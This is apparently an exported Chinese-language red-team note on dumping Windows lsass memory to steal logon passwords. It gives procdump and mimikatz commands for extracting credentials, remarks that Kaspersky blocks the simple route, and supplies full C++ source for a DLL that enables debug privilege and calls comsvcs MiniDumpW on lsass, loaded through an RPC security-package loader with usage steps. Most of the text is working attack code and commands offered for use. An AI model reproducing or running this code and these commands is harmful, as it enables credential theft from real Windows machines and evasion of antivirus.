<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>内存转储</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>内存转储</h1><br/><br /><br />内存转存<br /><br />上传prodcump.exe(微软工具箱内的工具)<br /><br />procdump.exe -accepteula -ma lsass.exe lsass.dmp<br /><br />也可以在任务管理器转储<br />然后从内存中读用户密码<br /><br />注意64位和32位<br />mimikatz.exe <br />sekurlsa::minidump lsass.dmp<br />sekurlsa::logonPasswords full<br />exit<br /><br /><br />卡巴斯基下会导出不了<br />利用RPC调用lsass，加载dll导出内存<br /><a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</a><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\501-AddSecurityPackage_RawRPC.zip">Linked file: AddSecurityPackage_RawRPC.zip </a></td></tr></table><br />直接编译成exe即可，需要在头部加 #pragma comment(lib,&quot;rpcrt4.lib&quot;)<br />dll代码<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;cstdio&gt;<br />#include&nbsp;&lt;windows.h&gt;<br />#include&nbsp;&lt;DbgHelp.h&gt;<br />#include&nbsp;&lt;iostream&gt;<br />#include&nbsp;&lt;TlHelp32.h&gt;<br />#include&nbsp;&lt;stdio.h&gt;<br />#pragma&nbsp;comment(lib,&quot;Dbghelp.lib&quot;)<br />typedef&nbsp;HRESULT(WINAPI*&nbsp;_MiniDumpW)(<br />&nbsp;&nbsp;DWORD&nbsp;arg1,&nbsp;DWORD&nbsp;arg2,&nbsp;PWCHAR&nbsp;cmdline);<br /><br /><br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;_RtlAdjustPrivilege)(<br />&nbsp;&nbsp;ULONG&nbsp;Privilege,&nbsp;BOOL&nbsp;Enable,<br />&nbsp;&nbsp;BOOL&nbsp;CurrentThread,&nbsp;PULONG&nbsp;Enabled);<br />char*&nbsp;WcharToChar(wchar_t*&nbsp;wc)<br />{<br />&nbsp;&nbsp;char*&nbsp;m_char;<br />&nbsp;&nbsp;int&nbsp;len&nbsp;=&nbsp;WideCharToMultiByte(CP_ACP,&nbsp;0,&nbsp;wc,&nbsp;wcslen(wc),&nbsp;NULL,&nbsp;0,&nbsp;NULL,&nbsp;NULL);<br />&nbsp;&nbsp;m_char&nbsp;=&nbsp;new&nbsp;char[len&nbsp;+&nbsp;1];<br />&nbsp;&nbsp;WideCharToMultiByte(CP_ACP,&nbsp;0,&nbsp;wc,&nbsp;wcslen(wc),&nbsp;m_char,&nbsp;len,&nbsp;NULL,&nbsp;NULL);<br />&nbsp;&nbsp;m_char[len]&nbsp;=&nbsp;&#39;\0&#39;;<br />&nbsp;&nbsp;return&nbsp;m_char;<br />}<br /><br /><br />DWORD&nbsp;ID(const&nbsp;char*&nbsp;pName)<br />{<br />&nbsp;&nbsp;HANDLE&nbsp;hSnapshot&nbsp;=&nbsp;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,&nbsp;0);<br />&nbsp;&nbsp;if&nbsp;(INVALID_HANDLE_VALUE&nbsp;==&nbsp;hSnapshot)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;PROCESSENTRY32&nbsp;pe&nbsp;=&nbsp;{&nbsp;sizeof(pe)&nbsp;};<br />&nbsp;&nbsp;for&nbsp;(BOOL&nbsp;ret&nbsp;=&nbsp;Process32First(hSnapshot,&nbsp;&amp;pe);&nbsp;ret;&nbsp;ret&nbsp;=&nbsp;Process32Next(hSnapshot,&nbsp;&amp;pe))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(WcharToChar(pe.szExeFile),pName)&nbsp;==&nbsp;0)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hSnapshot);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;pe.th32ProcessID;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;CloseHandle(hSnapshot);<br />&nbsp;&nbsp;return&nbsp;0;<br />}<br />int&nbsp;dump()&nbsp;{<br /><br /><br />&nbsp;&nbsp;HRESULT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hr;<br />&nbsp;&nbsp;_MiniDumpW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MiniDumpW;<br />&nbsp;&nbsp;_RtlAdjustPrivilege&nbsp;RtlAdjustPrivilege;<br />&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t;<br />&nbsp;&nbsp;MiniDumpW&nbsp;=&nbsp;(_MiniDumpW)GetProcAddress(<br />&nbsp;&nbsp;&nbsp;&nbsp;LoadLibrary(L&quot;comsvcs.dll&quot;),&nbsp;&quot;MiniDumpW&quot;);<br /><br /><br />&nbsp;&nbsp;RtlAdjustPrivilege&nbsp;=&nbsp;(_RtlAdjustPrivilege)GetProcAddress(<br />&nbsp;&nbsp;&nbsp;&nbsp;GetModuleHandle(L&quot;ntdll&quot;),&nbsp;&quot;RtlAdjustPrivilege&quot;);<br /><br /><br />&nbsp;&nbsp;if&nbsp;(MiniDumpW&nbsp;==&nbsp;NULL)&nbsp;{<br /><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;//&nbsp;try&nbsp;enable&nbsp;debug&nbsp;privilege<br />&nbsp;&nbsp;RtlAdjustPrivilege(20,&nbsp;TRUE,&nbsp;FALSE,&nbsp;&amp;t);<br /><br /><br />&nbsp;&nbsp;wchar_t&nbsp;&nbsp;ws[100];<br />&nbsp;&nbsp;DWORD&nbsp;pid&nbsp;=&nbsp;ID(&quot;lsass.exe&quot;);<br />&nbsp;&nbsp;swprintf(ws,&nbsp;100,&nbsp;L&quot;%u&nbsp;%hs&quot;,&nbsp;pid,&nbsp;&quot;c:\\windows\\temp\\temp.bin&nbsp;full&quot;);&nbsp;//784是lsass进程的pid号&nbsp;&nbsp;&quot;&lt;pid&gt;&nbsp;&lt;dump.bin&gt;&nbsp;full&quot;<br /><br /><br />&nbsp;&nbsp;MiniDumpW(0,&nbsp;0,&nbsp;ws);<br /><br /><br />&nbsp;&nbsp;return&nbsp;0;<br /><br /><br />}<br />BOOL&nbsp;APIENTRY&nbsp;DllMain(HMODULE&nbsp;hModule,&nbsp;DWORD&nbsp;&nbsp;ul_reason_for_call,&nbsp;LPVOID&nbsp;lpReserved&nbsp;&nbsp;)&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;switch&nbsp;(ul_reason_for_call)&nbsp;{<br />&nbsp;&nbsp;case&nbsp;DLL_PROCESS_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;dump();<br />&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;case&nbsp;DLL_THREAD_ATTACH:<br />&nbsp;&nbsp;case&nbsp;DLL_THREAD_DETACH:<br />&nbsp;&nbsp;case&nbsp;DLL_PROCESS_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;return&nbsp;TRUE;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />编译好的：<br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\501-loader.zip">Linked file: loader.zip </a></td></tr></table><br />用法：管理员权限<br />loader.exe &quot;E:\tmp\ssp.dll&quot;<br />保存在<a href="file://c:\\windows\\temp\\temp.bin">c:\windows\temp\temp.bin</a><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>